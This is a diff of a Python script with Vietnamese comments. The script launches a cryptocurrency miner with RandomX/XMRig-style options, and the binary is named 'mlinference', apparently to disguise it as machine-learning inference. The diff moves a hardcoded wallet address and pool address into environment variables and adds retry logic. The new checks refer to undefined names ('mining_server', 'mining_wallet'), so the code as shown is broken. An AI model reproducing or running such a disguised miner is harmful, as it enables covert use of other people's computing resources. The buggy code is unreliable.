@@ -106,21 +106,26 @@ def is_mining_process_running(mining_process):
     """
     return mining_process and mining_process.poll() is None
 
-
 def start_mining_process(retries=3, delay=5):
     """
     Khởi động quá trình khai thác bằng cách gọi mlinference với cơ chế thử lại.
-    
+
     Args:
         retries (int): Số lần thử lại nếu khởi chạy quá trình thất bại.
         delay (int): Thời gian chờ giữa các lần thử (giây).
-    
+
     Returns:
         subprocess.Popen or None: Đối tượng quá trình khai thác hoặc None nếu thất bại.
     """
-    # Đường dẫn đầy đủ đến thực thi mlinference
-    mining_executable = '/usr/local/bin/mlinference'
-    
+    # Lấy đường dẫn thực thi từ biến môi trường
+    mining_executable = os.getenv('MINING_COMMAND', '/usr/local/bin/mlinference')
+
+    # Kiểm tra giá trị biến môi trường MINING_COMMAND
+    if not mining_executable:
+        logger.error("Biến môi trường MINING_COMMAND không được thiết lập.")
+        stop_event.set()
+        return None
+
     # Kiểm tra xem tệp thực thi có tồn tại và có quyền thực thi không
     if not os.path.isfile(mining_executable):
         logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {mining_executable}")
@@ -130,39 +135,48 @@ def start_mining_process(retries=3, delay=5):
         logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {mining_executable}")
         stop_event.set()
         return None
-    
+
+    # Lấy địa chỉ máy chủ và địa chỉ ví từ biến môi trường
+    mining_server_cpu = os.getenv('MINING_SERVER_CPU')
+    mining_wallet_cpu = os.getenv('MINING_WALLET_CPU')
+
+    # Kiểm tra giá trị biến môi trường MINING_SERVER và MINING_WALLET
+    if not mining_server:
+        logger.error("Biến môi trường MINING_SERVER không được thiết lập.")
+        stop_event.set()
+        return None
+    if not mining_wallet:
+        logger.error("Biến môi trường MINING_WALLET không được thiết lập.")
+        stop_event.set()
+        return None
+
     # Định nghĩa lệnh khai thác dưới dạng danh sách
     mining_command = [
         mining_executable,
         '--donate-level', '1',
-        '-o', '127.0.0.1:4443',
-        '-u', '44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao',
+        '-o', mining_server_cpu,
+        '-u', mining_wallet_cpu,
         '-a', 'rx/0',
         '--no-huge-pages',
         '--tls'
     ]
 
+    # Thử khởi chạy quá trình khai thác
     for attempt in range(1, retries + 1):
-        logger.info(
-            f"Thử khởi chạy quá trình khai thác (Cố gắng {attempt}/{retries})..."
-        )
+        logger.info(f"Thử khởi chạy quá trình khai thác (Cố gắng {attempt}/{retries})...")
         try:
             mining_process = subprocess.Popen(
                 mining_command,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
             )
-            logger.info(
-                f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}"
-            )
+            logger.info(f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}")
 
             # Kiểm tra xem quá trình có đang chạy không
             time.sleep(2)  # Chờ một thời gian ngắn để tiến trình khởi chạy
             if mining_process.poll() is not None:
                 stdout, stderr = mining_process.communicate()
-                logger.error(
-                    f"Quá trình khai thác đã kết thúc ngay sau khi khởi động với mã trả về: {mining_process.returncode}"
-                )
+                logger.error(f"Quá trình khai thác đã kết thúc ngay sau khi khởi động với mã trả về: {mining_process.returncode}")
                 if stdout:
                     logger.error(f"STDOUT: {stdout.decode().strip()}")
                 if stderr:
@@ -183,7 +197,6 @@ def start_mining_process(retries=3, delay=5):
     logger.error("Tất cả các cố gắng khởi chạy quá trình khai thác đã thất bại.")
     stop_event.set()
     return None
-
 
 def main():
     """
